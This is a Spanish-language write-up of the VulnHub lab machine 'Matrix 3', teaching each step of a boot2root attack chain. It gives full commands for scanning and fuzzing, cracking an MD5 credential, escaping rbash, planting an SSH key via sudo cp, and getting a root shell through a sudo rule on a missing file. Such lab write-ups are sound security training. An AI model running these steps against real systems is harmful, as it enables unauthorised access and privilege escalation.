# Writeup extremadamente detallado de Matrix 3

## Descripción original y traducción

**Texto original:**

> Machine Details: Matrix is a medium level boot2root challenge Series of MATRIX Machines. The OVA has been tested on both VMware and Virtual Box.  
> Flags: Your Goal is to get root and read /root/flag.txt  
> Networking: DHCP: Enabled IP Address: Automatically assigned  
> Hint: Follow your intuitions ... and enumerate!

**Traducción al español:**

**Detalles de la máquina:** Matrix es un reto *boot2root* de dificultad media de la serie de máquinas MATRIX. La OVA ha sido probada tanto en VMware como en VirtualBox.  

**Objetivo:** Conseguir privilegios **root** y leer el archivo `/root/flag.txt`.  

**Red:** DHCP habilitado. La dirección IP se asigna automáticamente.  

**Pista:** Sigue tu intuición… y enumera.

---

## Qué significa boot2root

Una máquina *boot2root* es una máquina vulnerable diseñada para recorrer toda la cadena de ataque:

1. descubrir la IP de la víctima;
2. enumerar servicios y rutas;
3. encontrar una vía de entrada;
4. obtener acceso inicial;
5. escalar privilegios;
6. terminar como root;
7. leer la flag final.

La propia descripción te está avisando de algo importante: aquí no basta con ejecutar herramientas. Hay que observar, interpretar pistas y enumerar con paciencia.

---

## Configuración de red en NAT y por qué

Hemos configurado Kali y la víctima en **NAT**.

### Qué implica NAT

En NAT, el hipervisor crea una red privada virtual:

- la Kali y la víctima se ven entre sí;
- pueden salir hacia fuera a través del servicio NAT;
- pero no participan directamente en tu red física real.

### Por qué conviene en un laboratorio

Porque:

- reduces ruido;
- identificas mejor la víctima;
- evitas escanear dispositivos de tu red real;
- todo queda más controlado.

---

## Identificación de la IP atacante

Como siempre, empezamos con:

```bash
ip a
```

Nos interesa `eth0`, donde vemos una IP como:

```bash
inet 192.168.184.128/24
```

Eso significa:

- atacante: `192.168.184.128`
- máscara: `/24`
- red de trabajo: `192.168.184.0/24`

---

## Descubrimiento de la IP víctima

Lanzamos:

```bash
sudo nmap -n -sn 192.168.184.128/24
```

### Explicación de flags

#### `sudo`
Necesario para ciertos tipos de descubrimiento.

#### `-n`
No resuelve nombres DNS.

#### `-sn`
Solo descubre hosts activos. No escanea puertos.

#### `192.168.184.128/24`
Es el rango de red a recorrer.

---

## Resultado del descubrimiento

Aparecen estas IPs activas:

- `192.168.184.1`
- `192.168.184.2`
- `192.168.184.133`
- `192.168.184.254`
- `192.168.184.128`

### Por qué sabemos que la víctima es `192.168.184.133`

Porque:

- `192.168.184.128` es nuestra Kali;
- `.1`, `.2` y `.254` suelen ser elementos del NAT de VMware;
- por descarte, `192.168.184.133` es la máquina víctima.

---

## Escaneo completo de puertos

Ahora lanzamos:

```bash
sudo nmap -p- --open -sCV -Pn -T5 -vvv -oN fullscan 192.168.184.133
```

### Explicación de flags

#### `-p-`
Todos los puertos TCP.

#### `--open`
Solo muestra abiertos.

#### `-sC`
Scripts por defecto de Nmap.

#### `-sV`
Detección de versión.

#### `-Pn`
Asume que el host está activo.

#### `-T5`
Muy agresivo y rápido.

#### `-vvv`
Alta verbosidad.

#### `-oN fullscan`
Guarda salida en archivo.

---

## Puertos encontrados

```text
80/tcp   open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
6464/tcp open  ssh     OpenSSH 7.7
7331/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.14)
```

### Interpretación inicial

#### Puerto 80
Servidor web HTTP simple con Python.

#### Puerto 6464
SSH movido a puerto no estándar.

#### Puerto 7331
Otro servidor web con Python, probablemente sirviendo contenido distinto.

### Qué implica que sea `SimpleHTTPServer`

Esto no es Apache ni Nginx.  
Es el servidor HTTP muy simple que se puede lanzar desde Python, por ejemplo:

```bash
python -m SimpleHTTPServer
```

Eso suele implicar:

- contenido estático;
- directory listings;
- estructura simple;
- mucha enumeración manual.

---

## Puerto 80

Entramos a:

```text
http://192.168.184.133:80
```

y vemos la **imagen 1**.

![Imagen 1](files/imagen_1_puerto_80.png)

La página nos vuelve a insistir en “Follow the White Rabbit”, o sea, seguir el conejo blanco.

---

## Fuzzing en el puerto 80

Lanzamos:

```bash
ffuf -u http://192.168.184.133/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

### Explicación de flags

- `-u`: URL objetivo con marcador `FUZZ`.
- `-c`: color.
- `-w`: wordlist.
- `-t 100`: 100 hilos concurrentes.

### Resultado

Aparecen dos rutas interesantes:

```text
assets
Matrix
```

---

## Revisión de /assets

Entramos en:

```text
http://192.168.184.133/assets/
```

y vemos carpetas típicas de frontend:

- `css`
- `fonts`
- `img`
- `js`
- `vendors`

### Qué significa “frontend”

Es todo lo que usa el navegador para mostrar la página:

- estilos;
- fuentes;
- imágenes;
- scripts cliente;
- librerías.

No es backend ni lógica del servidor, pero igualmente puede contener pistas.

---

## Hallazgo en /assets/img

Dentro de `img/` aparece:

- `.gitkeep`
- `Matrix_can-show-you-the-door.png`

La imagen es un conejo blanco, como en la **imagen 2**.

![Imagen 2](files/imagen_2_conejo_blanco.png)

Eso refuerza la idea de que el reto quiere que sigamos pistas temáticas.

---

## Revisión de /Matrix

Entramos en:

```text
http://192.168.184.133/Matrix/
```

y aparece una estructura rara con letras:

```text
4/ 6/ c/ d/ e/ i/ k/ n/ o/ u/ v/ w/
```

### Cómo se resolvió

Aquí la idea no fue fuerza bruta pura, sino intuición:

- tema Matrix;
- protagonista principal = **Neo**

Así que pruebas la ruta:

```text
/Matrix/n/e/o/
```

Y dentro aparecen subdirectorios del 1 al 9.

Siguiendo las pruebas, acabas encontrando:

```text
/Matrix/n/e/o/6/4/
```

donde existe:

```text
secret.gz
```

Además, el autor usa mucho el 64 en su alias, así que este detalle encaja todavía mejor.

---

## Descarga de secret.gz y por qué falla al descomprimir

Al intentar descomprimirlo, gzip dice:

```bash
not in gzip format
```

### Por qué ocurre

Porque una extensión no garantiza el tipo real del archivo.  
Puede llamarse `.gz` y no ser un gzip real.

La forma correcta de verificarlo es con:

```bash
file secret.gz
```

Resultado:

```text
secret.gz: ASCII text
```

### Interpretación

No es un comprimido. Es texto plano con una extensión falsa para despistar.

---

## Lectura del supuesto .gz

Lo renombramos a `.txt` y hacemos:

```bash
cat secret.txt
```

Contenido:

```text
admin:76a2173be6393254e72ffa4d6df1030a
```

Tenemos:

- usuario: `admin`
- hash: `76a2173be6393254e72ffa4d6df1030a`

---

## Identificación del hash

Usando una herramienta de identificación, vemos que probablemente es **MD5**.

### Qué es MD5

MD5 es una función hash antigua de 128 bits.  
No se “descifra” de forma reversible: lo normal es crackearlo por comparación o diccionario.

El hash concreto se resuelve como:

```text
passwd
```

Así que obtenemos credenciales:

- usuario: `admin`
- contraseña: `passwd`

---

## Acceso al puerto 7331 con credenciales

Probamos esas credenciales en:

```text
http://192.168.184.133:7331/
```

y entramos, obteniendo la **imagen 3**.

![Imagen 3](files/imagen_3_panel_7331.png)

---

## Fuzzing del puerto 7331 y por qué primero falla

Probamos:

```bash
ffuf -u http://192.168.184.133:7331/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

Y todo devuelve `401 Unauthorized`.

### Por qué pasa

Porque el servicio está protegido con **HTTP Basic Authentication**.

#### Qué es HTTP Basic Authentication
Es el típico popup del navegador que pide usuario y contraseña.  
El cliente envía esos datos en la cabecera `Authorization`.

### Solución

Dar credenciales directamente en la URL para que ffuf las use:

```bash
ffuf -u http://admin:passwd@192.168.184.133:7331/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

Ahora sí funciona.

### Resultado

Aparecen dos rutas:

```text
data
assets
```

---

## Revisión de /data

Visitamos:

```text
http://192.168.184.133:7331/data/
```

Y dentro hay un archivo llamado `data`. Al pulsarlo, se descarga.

Lo movemos a nuestra carpeta de trabajo y hacemos:

```bash
file data
```

Resultado:

```text
PE32 executable for MS Windows 6.00 (GUI), Intel i386 Mono/.Net assembly, 3 sections
```

---

## Por qué un ejecutable Windows en una máquina Linux

Esto desconcierta al principio, pero aquí el archivo no está para ejecutarlo en la víctima.  
Está para que tú lo analices y extraigas información.

### Desglose del resultado de `file`

#### `PE32`
Formato Portable Executable de Windows.

#### `Intel i386`
Arquitectura de 32 bits.

#### `Mono/.Net assembly`
Muy importante: es un ensamblado .NET / Mono, es decir, un binario apto para reversing con herramientas como Ghidra.

---

## Uso de Ghidra

Ejecutamos `ghidra` y aparece la pantalla de la **imagen 4**, indicando que no hay proyecto activo.

![Imagen 4](files/imagen_4_ghidra_sin_proyecto.png)

### Crear proyecto

1. `File > New Project`
2. `Non-shared Project`
3. `Next`
4. nombre del proyecto, por ejemplo `Matrix`
5. `Finish`

Entonces aparece el proyecto creado, como en la **imagen 5**.

![Imagen 5](files/imagen_5_proyecto_creado.png)

---

## Importar el archivo data

Seleccionamos la carpeta del proyecto y hacemos:

```text
File > Import File
```

Importamos el archivo y aparece dentro del proyecto, como en la **imagen 6**.

![Imagen 6](files/imagen_6_archivo_importado.png)

Doble clic para abrirlo.

---

## Vista principal de Ghidra

Se abre el análisis del binario, como en la **imagen 7**.

![Imagen 7](files/imagen_7_ghidra_abierto.png)

Aquí vemos varias zonas:

- `Listing`
- `Decompiler`
- `Program Tree`
- `Symbol Tree`
- consola, etc.

Lo importante en esta resolución fue el árbol de símbolos de la izquierda.

---

## Qué significan Imports, Exports, Functions, Labels, Classes

En la **imagen 8** aparecen categorías como:

- Imports
- Exports
- Functions
- Labels
- Classes
- Namespaces

![Imagen 8](files/imagen_8_panel_symbols_classes.png)

### Explicación útil

#### Imports
Funciones externas usadas por el binario.

#### Exports
Funciones que el binario exporta.

#### Functions
Funciones detectadas dentro del programa.

#### Labels
Etiquetas simbólicas para direcciones o elementos del binario.  
Sirven para que el analista no tenga que leer solo direcciones hexadecimales.

#### Classes
Muy interesantes en .NET, porque pueden contener cadenas, métodos o estructuras relevantes.

#### Namespaces
Espacios de nombres del programa.

---

## Hallazgo clave dentro del binario

Revisando strings y elementos, encuentras algo muy útil:

```text
guest:7R1n17yN30
```

Tiene toda la pinta de ser credenciales en formato:

- usuario: `guest`
- contraseña: `7R1n17yN30`

Y eso es exactamente lo razonable que hay que probar.

---

## Acceso por SSH en el puerto 6464

Usamos:

```bash
ssh guest@192.168.184.133 -p 6464
```

### Explicación de la sintaxis

- `guest@host` → usuario remoto + host
- `-p 6464` → fuerza uso del puerto 6464, porque SSH por defecto usaría el 22

La conexión funciona y entramos como `guest`.

---

## Shell restringida: rbash

Una vez dentro, vemos que estamos en una **rbash**.

Cuando haces:

```bash
whoami
```

responde algo como:

```text
-rbash: whoami: command not found
```

### Qué es rbash

`rbash` es una Bash restringida.  
Se usa para limitar lo que un usuario puede hacer.

Puede impedir, según configuración:

- usar rutas con `/`;
- cambiar PATH;
- ejecutar comandos libres;
- cambiar de directorio;
- invocar otros shells.

---

## Escape con vi y por qué funciona

Igual que en Matrix2, pruebas con `vi`.

Dentro de `vi`, haces:

```vim
:!/bin/bash
```

### Por qué funciona

`vi` permite ejecutar comandos externos del sistema con `:!`.  
Si invocas `/bin/bash`, lanzas una shell nueva fuera de la lógica restringida original.

Resultado: una Bash mucho más funcional.

---

## Enfoque mejor: saltarse la rbash desde el propio SSH

También usas:

```bash
ssh guest@192.168.184.133 -p 6464 -t "bash --noprofile"
```

### Qué hace `-t`
Fuerza un pseudo-terminal.  
Eso permite ejecutar el comando remoto de forma interactiva.

### Qué hace `bash --noprofile`
Arranca una Bash limpia sin cargar perfiles ni configuraciones que puedan imponer restricciones.

### Por qué esto puede saltarse la rbash

Muchas rbash en labs dependen de:

- shell de login restringida;
- archivos de configuración cargados al iniciar.

Si tú fuerzas directamente una Bash limpia, evitas parte de esa lógica.

Resultado:
- `ls` funciona;
- `whoami` funciona;
- ya no necesitas depender del escape con `vi`.

---

## Enumeración local como guest

Revisas `.bash_history`, pero no hay pistas importantes: solo tus comandos.

Entonces haces:

```bash
sudo -l
```

Y ves:

```text
(root) NOPASSWD: /usr/lib64/xfce4/session/xfsm-shutdown-helper
(trinity) NOPASSWD: /bin/cp
```

Lo que realmente interesa aquí es:

```text
(trinity) NOPASSWD: /bin/cp
```

porque permite un movimiento lateral.

---

## Por qué copiar una clave SSH pública tiene sentido

Sabemos que existe otro usuario:

```bash
ls /home
```

resultado:

```text
guest
trinity
```

### Recordatorio: cómo funciona SSH por claves

Hay dos piezas:

1. **Clave privada**
   La guarda el cliente. Nunca se comparte.

2. **Clave pública**
   Se copia al servidor, dentro del usuario al que quieres acceder.

En el servidor, el archivo importante es:

```bash
~/.ssh/authorized_keys
```

Si una clave pública está ahí, la clave privada correspondiente puede autenticarse.

---

## Revisando la .ssh de guest

Ves:

```bash
known_hosts
```

### Qué es known_hosts y por qué no sirve para esto

`known_hosts` guarda claves de **servidores** a los que ya te conectaste, para comprobar identidad del host.

No contiene tus claves de autenticación, ni sirve para entrar como otro usuario.

---

## Generar un par de claves con ssh-keygen

Como `guest`, haces:

```bash
ssh-keygen
```

Aceptas valores por defecto y se generan:

- `id_rsa` → clave privada
- `id_rsa.pub` → clave pública

### Qué hace cada una

#### `id_rsa`
La usarás tú para autenticarte.

#### `id_rsa.pub`
Es la que vas a colocar en `authorized_keys` del usuario objetivo.

---

## Abusar de sudo -u trinity /bin/cp

El permiso dice que como `guest` puedes ejecutar `/bin/cp` como `trinity`.

Entonces haces algo como:

```bash
sudo -u trinity /bin/cp id_rsa.pub /home/trinity/.ssh/authorized_keys
```

### Explicación detallada

#### `sudo -u trinity`
Ejecuta el comando como usuario `trinity`.

#### `/bin/cp`
Es el binario permitido.

#### `id_rsa.pub`
Tu clave pública.

#### `/home/trinity/.ssh/authorized_keys`
El archivo de claves autorizadas de trinity.

### Qué consigues

Metes tu clave pública dentro de las claves aceptadas por `trinity`.  
Eso significa que tu clave privada correspondiente podrá entrar como ese usuario.

---

## Conexión SSH como trinity usando la clave privada

Ahora haces:

```bash
ssh trinity@127.0.0.1 -i /home/guest/.ssh/id_rsa -p 6464
```

### Explicación de flags

#### `trinity@127.0.0.1`
Quieres autenticarte como `trinity` en localhost, es decir, en la propia máquina.

#### `-i /home/guest/.ssh/id_rsa`
Usa esa clave privada.

#### `-p 6464`
Puerto SSH correcto.

### Por qué funciona

Porque el servidor SSH, al autenticar `trinity`, consulta:

```bash
/home/trinity/.ssh/authorized_keys
```

y allí encuentra la clave pública correspondiente a tu `id_rsa`.

Resultado:
👉 accedes como `trinity`.

---

## Enumeración como trinity

Lo primero correcto:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /home/trinity/oracle
```

### Qué significa

Como `trinity`, puedes ejecutar como root, sin contraseña, el archivo:

```bash
/home/trinity/oracle
```

---

## El detalle crítico: oracle no existe

Compruebas el contenido de `/home/trinity` y ese archivo no está.

### Por qué esto es explotable

Porque si sudo confía en una ruta fija y tú puedes crear ese archivo, entonces puedes decidir qué ejecutará root.

Ese es el fallo.

---

## Crear oracle y convertirlo en shell root

Haces:

```bash
echo "/bin/bash" > oracle
chmod 777 oracle
sudo ./oracle
```

### Explicación

#### `echo "/bin/bash" > oracle`
Crea un archivo llamado `oracle` que ejecuta `/bin/bash`.

#### `chmod 777 oracle`
Le da permisos totales. Lo importante es que sea ejecutable.

#### `sudo ./oracle`
Lo ejecuta como root, porque `sudo -l` lo permitía.

### Qué pasa en realidad

Root ejecuta ese archivo.  
El archivo llama a `/bin/bash`.  
Por tanto, obtienes una Bash con privilegios de root.

---

## Lectura de la flag

Ya como root:

```bash
cd /root
cat flag.txt
```

y obtienes la flag final.

---

## Cadena completa de ataque

1. descubrir la IP víctima;
2. enumerar puertos;
3. revisar la web del 80;
4. fuzzear y encontrar `assets` y `Matrix`;
5. seguir la pista temática de Neo en `/Matrix/n/e/o/`;
6. encontrar `secret.gz`;
7. detectar que no era un gzip real;
8. leer `admin:hash`;
9. crackear el MD5 a `passwd`;
10. entrar en el 7331 con Basic Auth;
11. fuzzear autenticado;
12. descargar el binario `data`;
13. analizarlo con Ghidra;
14. extraer `guest:7R1n17yN30`;
15. entrar por SSH al puerto 6464;
16. saltar la rbash;
17. revisar `sudo -l`;
18. usar `cp` como `trinity` para colocar una clave pública en `authorized_keys`;
19. entrar por SSH como `trinity`;
20. revisar `sudo -l` otra vez;
21. detectar el comando permitido sobre `/home/trinity/oracle`;
22. crear el archivo `oracle`;
23. ejecutarlo con sudo;
24. obtener root y leer la flag.

---

## Conceptos importantes aprendidos

### 1. La temática puede guiar rutas
En CTFs y VulnHub, “seguir el conejo blanco” o pensar en Neo puede ser una pista operativa real.

### 2. `file` es obligatorio
Nunca te fíes de la extensión.

### 3. Basic Auth y ffuf
Si un sitio usa autenticación básica, el fuzzing sin credenciales se queda en 401.

### 4. Un binario descargado puede ser solo una pista
No siempre hay que ejecutarlo; a veces hay que hacer reversing.

### 5. Ghidra sirve perfectamente para extraer strings y credenciales
No hace falta descompilar todo para encontrar valor.

### 6. rbash puede saltarse
Con binarios interactivos como `vi`, o lanzando una Bash limpia por SSH.

### 7. SSH con claves es potentísimo para pivotar entre usuarios
Si puedes escribir en `authorized_keys` de otro usuario, puedes entrar como él.

### 8. sudo sobre una ruta fija inexistente es peligrosísimo
Si puedes crear esa ruta, controlas qué ejecuta root.

---

## Comandos utilizados

```bash
ip a
sudo nmap -n -sn 192.168.184.128/24
sudo nmap -p- --open -sCV -Pn -T5 -vvv -oN fullscan 192.168.184.133
ffuf -u http://192.168.184.133/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
file secret.gz
cat secret.txt
ffuf -u http://192.168.184.133:7331/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
ffuf -u http://admin:passwd@192.168.184.133:7331/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
ghidra
ssh guest@192.168.184.133 -p 6464
ssh guest@192.168.184.133 -p 6464 -t "bash --noprofile"
sudo -l
ssh-keygen
sudo -u trinity /bin/cp id_rsa.pub /home/trinity/.ssh/authorized_keys
ssh trinity@127.0.0.1 -i /home/guest/.ssh/id_rsa -p 6464
sudo -l
echo "/bin/bash" > oracle
chmod 777 oracle
sudo ./oracle
cat /root/flag.txt
```

---

## Cierre

Esta máquina es muy buena para practicar algo esencial: no todo se resuelve con una vulnerabilidad única y espectacular.

Aquí encadenas:

- enumeración web;
- interpretación temática;
- hash cracking;
- reversing con Ghidra;
- escape de shell restringida;
- pivoting con claves SSH;
- y abuso de sudo sobre una ruta controlable.

Es una máquina donde aprendes muy bien que el pentesting muchas veces consiste en **ir uniendo pistas pequeñas hasta construir una explotación completa**.
